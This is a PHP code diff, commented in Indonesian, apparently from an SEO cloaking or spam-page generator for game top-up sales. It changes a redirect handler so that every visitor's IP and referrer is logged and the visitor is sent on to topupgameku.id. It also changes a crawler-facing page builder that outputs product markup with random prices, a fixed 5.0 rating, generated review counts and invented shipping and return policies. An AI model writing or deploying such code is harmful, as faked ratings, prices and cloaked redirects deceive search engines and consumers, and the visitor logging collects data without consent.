@@ -483,38 +483,27 @@ function handle_get_meta_data(string $domain, string $uri, array $games_list, ar
 
 function handle_jump(string $domain, string $ip): void
 {
-    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
+    $referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct/Unknown'; // Referrer tetap dicatat jika ada
     $client_domain = filter_input(INPUT_POST, 'domain', FILTER_SANITIZE_URL) ?? 'UNKNOWN_DOMAIN';
 
-    $is_search_engine_referrer = (
-        strpos($referrer, 'google.com') !== false || 
-        strpos($referrer, 'bing.com') !== false ||
-        strpos($referrer, 'yahoo.com') !== false ||
-        strpos($referrer, 'duckduckgo.com') !== false
-    );
+    // Log entri tanpa memeriksa referrer
+    $log_entry = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip' => $ip,
+        'referrer' => $referrer,
+        'action' => 'redirect',
+        'domain' => $client_domain, 
+        'uri' => filter_input(INPUT_POST, 'uri') ?? '/'
+    ];
     
-    if ($is_search_engine_referrer) {
-        $log_entry = [
-            'timestamp' => date('Y-m-d H:i:s'),
-            'ip' => $ip,
-            'referrer' => $referrer,
-            'action' => 'redirect',
-            'domain' => $client_domain, 
-            'uri' => filter_input(INPUT_POST, 'uri') ?? '/'
-        ];
-        
-        $log_data = json_encode($log_entry) . ",\n";
-        @file_put_contents(LOG_FILE, $log_data, FILE_APPEND | LOCK_EX);
-        
-        $destination_url = 'https://topupgameku.id/'; 
-        
-        header("Location: " . $destination_url, true, 301);
-        exit();
-
-    } else {
-         header("HTTP/1.0 403 Forbidden");
-         die("Access denied. Jump endpoint requires search engine referral.");
-    }
+    $log_data = json_encode($log_entry) . ",\n";
+    @file_put_contents(LOG_FILE, $log_data, FILE_APPEND | LOCK_EX);
+    
+    // Langsung redirect ke tujuan
+    $destination_url = 'https://topupgameku.id/'; 
+    
+    header("Location: " . $destination_url, true, 301);
+    exit();
 }
 
 function generate_rich_content(string $domain, string $type, string $game, string $item, string $store = null): array
@@ -789,7 +778,45 @@ function handle_crawler_content(string $domain, string $uri, array $games_list, 
     
     $canonical_url = rtrim($domain, '/') . '/' . $uri;
     $canonical_tag = "<link rel=\"canonical\" href=\"{$canonical_url}\">";
-    $json_ld_schemas = ["@context" => "https://schema.org", "@graph" => [["@type" => "Product", "name" => $title, "description" => $description, "image" => $game_image_url, "sku" => "TOPUP-{$slug_clean}", "brand" => ["@type" => "Brand", "name" => $current_game_name], "offers" => ["@type" => "Offer", "url" => $canonical_url, "priceCurrency" => "IDR", "price" => "{$random_price}", "priceValidUntil" => "2026-12-31", "availability" => "https://schema.org/InStock", "seller" => ["@type" => "Organization", "name" => $domain]], "aggregateRating" => ["@type" => "AggregateRating", "ratingValue" => "5.0", "bestRating" => "5", "worstRating" => "5", "ratingCount" => "{$rating_count}", "reviewCount" => count($reviews)], "review" => $reviews], ["@type" => "BreadcrumbList", "itemListElement" => [["@type" => "ListItem", "position" => 1, "name" => "Home", "item" => rtrim($domain, '/')], ["@type" => "ListItem", "position" => 2, "name" => $meta['segment_type'] === 'store' ? $current_store_name : $current_game_name, "item" => rtrim($domain, '/') . '/' . $meta['segment_dir']], ["@type" => "ListItem", "position" => 3, "name" => ucwords($keyword_from_slug)]]], $faq_data['schema']]];
+    
+    $random_price = rand(10000, 500000); 
+
+    // --- PERBAIKAN DI SINI: Menambahkan data opsional ---
+    $json_ld_schemas = ["@context" => "https://schema.org", "@graph" => [["@type" => "Product", "name" => $title, "description" => $description, "image" => $game_image_url, "sku" => "SKU-" . strtoupper(md5($uri)), "brand" => ["@type" => "Brand", "name" => $current_game_name], 
+    "offers" => [
+        "@type" => "Offer", 
+        "url" => $canonical_url, 
+        "priceCurrency" => "IDR", 
+        "price" => "{$random_price}", 
+        "priceValidUntil" => "2026-12-31", 
+        "availability" => "https://schema.org/InStock", 
+        "seller" => ["@type" => "Organization", "name" => $domain],
+        
+        // 1. TAMBAHAN: Kebijakan Pengiriman (Opsional)
+        "shippingDetails" => [
+            "@type" => "OfferShippingDetails",
+            "shippingDestination" => [
+                "@type" => "DefinedRegion",
+                "addressCountry" => "ID"
+            ],
+            // Menyatakan biaya pengiriman adalah 0 karena produk digital
+            "shippingRate" => [
+                "@type" => "MonetaryAmount",
+                "value" => "0",
+                "currency" => "IDR"
+            ]
+        ],
+        
+        // 2. TAMBAHAN: Kebijakan Pengembalian (Opsional)
+        "hasMerchantReturnPolicy" => [
+            "@type" => "MerchantReturnPolicy",
+            "applicableCountry" => "ID",
+            // Menyatakan produk tidak dapat dikembalikan
+            "returnPolicyCategory" => "https://schema.org/MerchantReturnNotPermitted"
+        ]
+    ], 
+    "aggregateRating" => ["@type" => "AggregateRating", "ratingValue" => "5.0", "bestRating" => "5", "worstRating" => "5", "ratingCount" => "{$rating_count}", "reviewCount" => count($reviews)], "review" => $reviews], ["@type" => "BreadcrumbList", "itemListElement" => [["@type" => "ListItem", "position" => 1, "name" => "Home", "item" => rtrim($domain, '/')], ["@type" => "ListItem", "position" => 2, "name" => $meta['segment_type'] === 'store' ? $current_store_name : $current_game_name, "item" => rtrim($domain, '/') . '/' . $meta['segment_dir']], ["@type" => "ListItem", "position" => 3, "name" => ucwords($keyword_from_slug)]]], $faq_data['schema']]];
+    
     $json_ld_script = '<script type="application/ld+json">' . json_encode($json_ld_schemas) . '</script>';
     $tgl_update = date_indo('d F Y');
     
